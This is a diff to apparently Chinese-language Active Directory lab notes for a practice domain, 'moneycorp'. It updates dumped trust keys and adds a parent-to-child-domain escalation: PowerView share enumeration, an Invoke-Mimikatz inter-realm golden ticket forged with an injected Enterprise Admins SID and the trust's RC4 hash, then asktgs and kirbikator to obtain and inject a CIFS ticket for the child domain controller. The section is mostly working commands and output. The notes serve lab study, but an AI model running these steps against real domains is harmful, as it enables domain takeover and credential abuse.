@@ -1008,10 +1008,10 @@ Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
 ```
 Domain: US.DOLLARCORP.MONEYCORP.LOCAL (us / S-1-5-21-3146393536-1393405867-2905981701)
  [  In ] DOLLARCORP.MONEYCORP.LOCAL -> US.DOLLARCORP.MONEYCORP.LOCAL
-    * 3/16/2021 7:44:52 AM - CLEAR   - 40 84 47 82 3b 03 64 82 0f 8e bf d3 78 18 df db d4 5f 13 bc 4d 7c df b5 8e f8 e3 29 ae e1 01 ce 20 c4 03 48 8f 4f 4e 77 eb a0 3b 1d 55 84 ba b0 72 62 4d df 34 df 2d 67 e7 78 8a 6a 18 99 87 11 f2 56 d7 34 e5 9b 88 b1 9d 91 b3 4e 11 2f 76 89 c2 45 7d c6 20 9a 83 97 ca 50 0e 33 d2 04 4f 82 83 69 46 d6 13 cf 8f db cd fe 3d 87 66 c9 ca 7f 24 38 ff c0 1b 5a 5f bf 58 b3 c7 83 06 2c f0 da fd f4 1b 46 de ca 61 e6 8e 8f ec d5 a8 6e 57 84 6f 42 cb 8c b3 ff 3f 14 8a c4 7c a7 c0 17 60 31 a0 2c 4b 0c 44 80 9e 37 77 37 df ea 32 96 16 ab e5 a3 f5 0b 8c 46 d9 7f 26 f3 05 7c 7f bb ac 16 be 5c ea a3 50 ee f0 ef 9a 4e fe a3 0a 6d f6 f2 5f c9 54 ee 47 20 02 ae 07 96 c4 c8 08 64 70 56 59 28 22 00 53 74 be 67 45 03 d9 e6 86 e5 36 42
-        * aes256_hmac       f13e09bb5b6f02a995d99a4c95982c1e6411b1b252d1aa268c25b9adcd22953f
-        * aes128_hmac       20e6b9441a57a19d14c62bb87a055264
-        * rc4_hmac_nt       3c26a18320e50801d1c3843a129617f8
+    * 2/22/2022 1:47:50 AM - CLEAR   - 98 92 74 31 9d 75 ef 06 71 30 f4 23 88 78 d0 8c 63 e6 a1 c4 d3 1d ea c0 81 ea f4 f8
+        * aes256_hmac       bcd2a265b3f6626193662328115b78823de5ef3e5d11bcefac08f311e6cfca24
+        * aes128_hmac       ac4ab1dc6a1477d36ee37aea2ad48396
+        * rc4_hmac_nt       925c2b6bf5771525b47a4a20d624b463
 ```
 
 与另外一个森林里的eurocorp.local的信任关系
@@ -1167,6 +1167,59 @@ PS C:\Windows\system32> hostname
 mcorp-dc
 PS C:\Windows\system32>
 ```
+
+
+## 父域到子域
+
+枚举子域的计算机
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Get-NetComputer -Domain us.dollarcorp.moneycorp.local
+us-dc.us.dollarcorp.moneycorp.local
+```
+
+枚举子域DC上的分享文件盘
+```
+PS C:\ad> . .\PowerView.ps1
+PS C:\ad> Invoke-ShareFinder -ComputerName us-dc.us.dollarcorp.moneycorp.local
+\\us-dc.us.dollarcorp.moneycorp.local\ADMIN$    - Remote Admin
+\\us-dc.us.dollarcorp.moneycorp.local\C$        - Default share
+\\us-dc.us.dollarcorp.moneycorp.local\IPC$      - Remote IPC
+\\us-dc.us.dollarcorp.moneycorp.local\NETLOGON  - Logon server share
+\\us-dc.us.dollarcorp.moneycorp.local\SYSVOL    - Logon server share
+```
+
+
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-3146393536-1393405867-2905981701-519 /rc4:925c2b6bf5771525b47a4a20d624b463 /service:krbtgt /target:us.dollarcorp.moneycorp.local /ticket:C:\AD\kekeo_old\parent2child_trust_tkt.kirbi"'
+
+
+.\asktgs.exe C:\AD\kekeo_old\parent2child_trust_tkt.kirbi CIFS/us-dc.us.dollarcorp.moneycorp.local
+
+
+
+PS C:\ad\kekeo_old> .\asktgs.exe C:\AD\kekeo_old\parent2child_trust_tkt.kirbi CIFS/us-dc.us.dollarcorp.moneycorp.local
+
+  .#####.   AskTGS Kerberos client 1.0 (x86) built on Dec  8 2016 00:31:13
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
+  '#####'                                                     * * */
+
+Ticket    : C:\AD\kekeo_old\parent2child_trust_tkt.kirbi
+Service   : krbtgt / us.dollarcorp.moneycorp.local @ dollarcorp.moneycorp.local
+Principal : Administrator @ dollarcorp.moneycorp.local
+
+> CIFS/us-dc.us.dollarcorp.moneycorp.local
+  * Ticket in file 'CIFS.us-dc.us.dollarcorp.moneycorp.local.kirbi'
+
+
+.\kirbikator.exe lsa .\CIFS.us-dc.us.dollarcorp.moneycorp.local.kirbi
+
+
+ls \\us-dc.us.dollarcorp.moneycorp.local\c$
+
+Invoke-ShareFinder  –Verbose
 
 
 # 跨林访问
